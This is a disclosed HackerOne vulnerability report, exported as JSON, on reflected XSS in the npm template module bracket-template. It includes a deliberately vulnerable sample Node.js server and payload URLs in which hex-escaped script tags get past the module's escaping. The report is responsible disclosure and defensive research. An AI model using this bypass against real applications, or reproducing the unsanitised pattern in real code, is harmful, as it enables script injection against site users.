{
  "id": 317125,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTcxMjU=",
  "url": "https://hackerone.com/reports/317125",
  "title": "[bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-02-17T14:19:09.371Z",
  "submitted_at": "2018-02-17T14:19:09.371Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-04-09T14:58:19.748Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-03-10T14:58:15.958Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\nI would like to report Reflected XSS in bracket-template module.\nIt allows to inject arbitrary JavaScript tag and malicious code to execute when variables read from GET are used directly in template without sanitization.\n\n## Module\n\n**module name:** bracket-template\n**version:** 1.1.5\n**npm page:** https://www.npmjs.com/package/bracket-template\n\n### Description\n\nMinimal (Ã¼ber fast) Javascript engine compatible with node.js and browsers.\n\n### Module Stats\n\nStats:\n\n51 downloads in the last day\n209 downloads in the last week\n835 downloads in the last month\n\n~10000 estimated downloads per year\n\n## Description\n\nWhile testing ```bracket-template``` module, I've found that there is possibility to inject malicious ```<script>``` tag followed by JavaScript code when values passed via GET are used in templates directly, without any sanitization.\n\n## Steps To Reproduce:\n\n- install ```bracket-template``` module:\n\n```\n$ npm install bracket-template\n```\n\n- create sample aaplication, which reads ```name``` from url and displays welcome message in the browser:\n\n```javascript\n// app.js file\nconst http = require('http')\nconst bracket = require('bracket-template').default\nconst port = 8080\n\nfunction createHTML(name) {\n    let tpl = `\n        [[ const n = '${name}'; ]]\n        <strong>Hello [[= n ]]</strong>\n    `\n    return bracket.compile(tpl)\n}\n\nconst requestHandler = (request, response) => {\n    const name = request.url.split('=')[1]\n    response.writeHeader(200, { \"Content-Type\": \"text/html\" });\n    response.write(createHTML(name)());\n    response.end();\n}\n\nconst server = http.createServer(requestHandler)\n\nserver.listen(port, (err) => {\n    if (err) {\n        return console.log(err)\n    }\n    console.log(`server is listening on ${port}`)\n})\n```\n\n- run application:\n\n```\n$ node app.js\n```\n\n- open ```http://localhost:8080?name=bl4de``` in the browser. You will notice expected result:\n\n{F264368}\n\n- now, try to inject following malicious XSS payload: ```http://localhost:8080?name=bl4de<script>console.log('XSS?')</script>```. You will notice all HTML special characters were escaped:\n\n{F264369}\n\n\n- this time, use following payload: ```http://localhost:8080/?name=bl4de\\x3cscript\\x3econsole.log(\\x22uh\\x20oh,\\x20XSS...\\x20:(\\x22)\\x3c\\x2fscript\\x3e``` and see the result in browser dev tools console:\n\n\n{F264370}\n\n\nWhen we investigate HTML returned from the server, we can notice using ```\\x[hex][hex]``` notation allows to inject any HTML special character and crafts XSS payload:\n\n```HTML\n<strong>Hello bl4de<script>console.log(\"uh oh, XSS... :(\")</script></strong>\n```\n\nAlso, I have noticed that this vector is not detected by built-in XSS protection (XSS Auditor) in Blink/WebKit based browsers (Chromium, Safari, Chrome, Opera), which causes additional risk for anyone who uses ```bracket-template``` in production application.\n\n\n## Supporting Material/References:\n\nThis issue was found and tested with following setup:\n\n- macOS HighSierra 10.13.3\n- Node.js v.8.9.3\n- npm v. 5.5.1\n- Chromium 66.0.3342.0, Safari 11.03 (with XSS Auditor enabled), Chrome 64.0.3282.167 (with XSS Auditor enabled)\n\n## Wrap up\n\n- I contacted the maintainer to let him know: No\n- I opened an issue in the related repository: No\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis issue can be used by malicious user to exploit Reflected XSS against application  which outputs variables passed via GET parameters directly in template(s) without any sanitization.",
  "weakness": {
    "id": 61,
    "name": "Cross-site Scripting (XSS) - Reflected"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 264368,
      "file_name": "1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/368/5404583ac56a8e64b69905947920c21c08640253/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXKE6YM6U%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T183104Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDt4L48uRbifTFdEoFd5NtoUorejmdczUj3Ph8voAE1jAIgTgQg5M1Ntyl3amKMDTbsCSxHDqmlNDE1kOghMsSLJkMqsgUIFxADGgwwMTM2MTkyNzQ4NDkiDJxi5ydRI8Zf7QmznSqPBc0a%2B2pQmy0QVrYuNOA0yNsZA0EX9kJ7VzgcobKznfPop9LN6Yr2z4RcdpmTHe7bIdrv7RGgv%2Fal0ELDi7aabZr7CPcthBmffb84hnBIoDbzgkRyXPAZcSwJEYAk83IqKNYX3qgO5ubZvR0A52FKHDUwAXUKVvOco%2Fg85PbW68mQ3Hzi26b03BNbI9VYnf%2F681vTWkJ7VElk7IVAyZ6FgwftAVaVXzZaYueN7%2BWw4xHOQEa15e%2Bo0PcclsDrLKygXl45bl29k7VLEpfuDgdRYXRxAepDysk7Fs%2FAvsmFoyA6O3Gcls7MvHg4UUvxglDdpRUtzrW2aiEE%2FIiPtdIsRq3iJ5F7yfgwQQwXdmiozX5lrIJfqfn%2FbCzEG2HH72NNLNwYDv3dHFR7IpJYdG8AZk8bmUtYGnZLBgNbd15xdZlftz7RLasWtvioLEzPmC3TvPkoXyaygYdxha%2BpwwfiO4XhJJ80%2BvWAgA3B%2F8Da9mnG73gWKaT69P3MQ0v%2F%2Big7uPpPnVJbhTCBZ8LHFGdVfLkAFbCzvVZgW3pGHJxGSGVfFsFdfo%2FqLUITrjFi7C5cjKAyrpAjxE8k0fJvtSLEmvJEcF1Lb%2F4N%2B%2BJ2bJ6kXevSQGvDjbZqe%2FNOEnZNN9rUTUHVCF3tBWhJ7htr7PTIyxguQ5%2FQdNlmqasPfRYjUrGtaMUcL7g87%2BJIrhMtQY%2FkiI0%2BGTdTAtjIXIJapJJ4si%2FB%2FA96VqEZzJBmR9kxkFqFVPOdmnsqzlWypMRJUSPF2Jj%2FzbRkIUnDfS6LS6CCk7%2BMf7NC10pVOxHPs5EBalSDgIMbM7sMpfnUZU7qifGTDEhRLcdkKBc3C26b3pmtXqsnjbRKlpi8OhfZ401kj4wwoY%2FAxgY6sQE9jmhH95D7GwDQPOZgc74SwnoOV%2Fg%2BIpnglNXdntkXYldw0Ucs3HF6BzS%2FHmCtvK%2BEWfi%2Bq%2BBcQ6MqEJ43K6CD2E7GsLl56SI5TcOq3DR1MgDvzPiAYDTuVmHfTZkfJHnfJZFe6qBg67d2mBe7U4OAJ55F8zP3slEoczL0FtiCU1YvRkkBbL1c%2F8MjEeb%2F5V5E6icFpTq1c%2F8IsSkgDUiSWDT416YYw0LdcVroDWfFveI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0577591674803368074d613d7f21503ee9b44a7f6f6a77abd5aea486ed21e972",
      "file_size": 113040,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 264369,
      "file_name": "2.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/369/380fbd02d94f877178129f6ec4c2a0bc011e5fbe/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXKE6YM6U%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T183104Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDt4L48uRbifTFdEoFd5NtoUorejmdczUj3Ph8voAE1jAIgTgQg5M1Ntyl3amKMDTbsCSxHDqmlNDE1kOghMsSLJkMqsgUIFxADGgwwMTM2MTkyNzQ4NDkiDJxi5ydRI8Zf7QmznSqPBc0a%2B2pQmy0QVrYuNOA0yNsZA0EX9kJ7VzgcobKznfPop9LN6Yr2z4RcdpmTHe7bIdrv7RGgv%2Fal0ELDi7aabZr7CPcthBmffb84hnBIoDbzgkRyXPAZcSwJEYAk83IqKNYX3qgO5ubZvR0A52FKHDUwAXUKVvOco%2Fg85PbW68mQ3Hzi26b03BNbI9VYnf%2F681vTWkJ7VElk7IVAyZ6FgwftAVaVXzZaYueN7%2BWw4xHOQEa15e%2Bo0PcclsDrLKygXl45bl29k7VLEpfuDgdRYXRxAepDysk7Fs%2FAvsmFoyA6O3Gcls7MvHg4UUvxglDdpRUtzrW2aiEE%2FIiPtdIsRq3iJ5F7yfgwQQwXdmiozX5lrIJfqfn%2FbCzEG2HH72NNLNwYDv3dHFR7IpJYdG8AZk8bmUtYGnZLBgNbd15xdZlftz7RLasWtvioLEzPmC3TvPkoXyaygYdxha%2BpwwfiO4XhJJ80%2BvWAgA3B%2F8Da9mnG73gWKaT69P3MQ0v%2F%2Big7uPpPnVJbhTCBZ8LHFGdVfLkAFbCzvVZgW3pGHJxGSGVfFsFdfo%2FqLUITrjFi7C5cjKAyrpAjxE8k0fJvtSLEmvJEcF1Lb%2F4N%2B%2BJ2bJ6kXevSQGvDjbZqe%2FNOEnZNN9rUTUHVCF3tBWhJ7htr7PTIyxguQ5%2FQdNlmqasPfRYjUrGtaMUcL7g87%2BJIrhMtQY%2FkiI0%2BGTdTAtjIXIJapJJ4si%2FB%2FA96VqEZzJBmR9kxkFqFVPOdmnsqzlWypMRJUSPF2Jj%2FzbRkIUnDfS6LS6CCk7%2BMf7NC10pVOxHPs5EBalSDgIMbM7sMpfnUZU7qifGTDEhRLcdkKBc3C26b3pmtXqsnjbRKlpi8OhfZ401kj4wwoY%2FAxgY6sQE9jmhH95D7GwDQPOZgc74SwnoOV%2Fg%2BIpnglNXdntkXYldw0Ucs3HF6BzS%2FHmCtvK%2BEWfi%2Bq%2BBcQ6MqEJ43K6CD2E7GsLl56SI5TcOq3DR1MgDvzPiAYDTuVmHfTZkfJHnfJZFe6qBg67d2mBe7U4OAJ55F8zP3slEoczL0FtiCU1YvRkkBbL1c%2F8MjEeb%2F5V5E6icFpTq1c%2F8IsSkgDUiSWDT416YYw0LdcVroDWfFveI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1252d52655913dc4793c3345d87a2bfd061fa6daf1ea03b534881624f37ce472",
      "file_size": 167346,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 264370,
      "file_name": "3.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/370/476deed12b4d2d1b03e8420ba470c80f8c1b2cf8/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXKE6YM6U%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T183104Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDt4L48uRbifTFdEoFd5NtoUorejmdczUj3Ph8voAE1jAIgTgQg5M1Ntyl3amKMDTbsCSxHDqmlNDE1kOghMsSLJkMqsgUIFxADGgwwMTM2MTkyNzQ4NDkiDJxi5ydRI8Zf7QmznSqPBc0a%2B2pQmy0QVrYuNOA0yNsZA0EX9kJ7VzgcobKznfPop9LN6Yr2z4RcdpmTHe7bIdrv7RGgv%2Fal0ELDi7aabZr7CPcthBmffb84hnBIoDbzgkRyXPAZcSwJEYAk83IqKNYX3qgO5ubZvR0A52FKHDUwAXUKVvOco%2Fg85PbW68mQ3Hzi26b03BNbI9VYnf%2F681vTWkJ7VElk7IVAyZ6FgwftAVaVXzZaYueN7%2BWw4xHOQEa15e%2Bo0PcclsDrLKygXl45bl29k7VLEpfuDgdRYXRxAepDysk7Fs%2FAvsmFoyA6O3Gcls7MvHg4UUvxglDdpRUtzrW2aiEE%2FIiPtdIsRq3iJ5F7yfgwQQwXdmiozX5lrIJfqfn%2FbCzEG2HH72NNLNwYDv3dHFR7IpJYdG8AZk8bmUtYGnZLBgNbd15xdZlftz7RLasWtvioLEzPmC3TvPkoXyaygYdxha%2BpwwfiO4XhJJ80%2BvWAgA3B%2F8Da9mnG73gWKaT69P3MQ0v%2F%2Big7uPpPnVJbhTCBZ8LHFGdVfLkAFbCzvVZgW3pGHJxGSGVfFsFdfo%2FqLUITrjFi7C5cjKAyrpAjxE8k0fJvtSLEmvJEcF1Lb%2F4N%2B%2BJ2bJ6kXevSQGvDjbZqe%2FNOEnZNN9rUTUHVCF3tBWhJ7htr7PTIyxguQ5%2FQdNlmqasPfRYjUrGtaMUcL7g87%2BJIrhMtQY%2FkiI0%2BGTdTAtjIXIJapJJ4si%2FB%2FA96VqEZzJBmR9kxkFqFVPOdmnsqzlWypMRJUSPF2Jj%2FzbRkIUnDfS6LS6CCk7%2BMf7NC10pVOxHPs5EBalSDgIMbM7sMpfnUZU7qifGTDEhRLcdkKBc3C26b3pmtXqsnjbRKlpi8OhfZ401kj4wwoY%2FAxgY6sQE9jmhH95D7GwDQPOZgc74SwnoOV%2Fg%2BIpnglNXdntkXYldw0Ucs3HF6BzS%2FHmCtvK%2BEWfi%2Bq%2BBcQ6MqEJ43K6CD2E7GsLl56SI5TcOq3DR1MgDvzPiAYDTuVmHfTZkfJHnfJZFe6qBg67d2mBe7U4OAJ55F8zP3slEoczL0FtiCU1YvRkkBbL1c%2F8MjEeb%2F5V5E6icFpTq1c%2F8IsSkgDUiSWDT416YYw0LdcVroDWfFveI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aa61a2e40df6eccd4d126334029f8c041c9becba4375497a8ce1d0b5c0ef9619",
      "file_size": 139693,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-04-09T14:58:16.031Z",
  "allow_singular_disclosure_after": -235193568.0947031,
  "singular_disclosure_allowed": true,
  "vote_count": 9,
  "voters": [
    "k0ns0l",
    "muhammad_uwais",
    "whitesector",
    "eveeez",
    "pandaonair",
    "x1m",
    "khaledibnalwalid",
    "japz",
    "vibs123i"
  ],
  "severity": {
    "rating": "high",
    "score": 8.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 6793,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "bracket-template",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
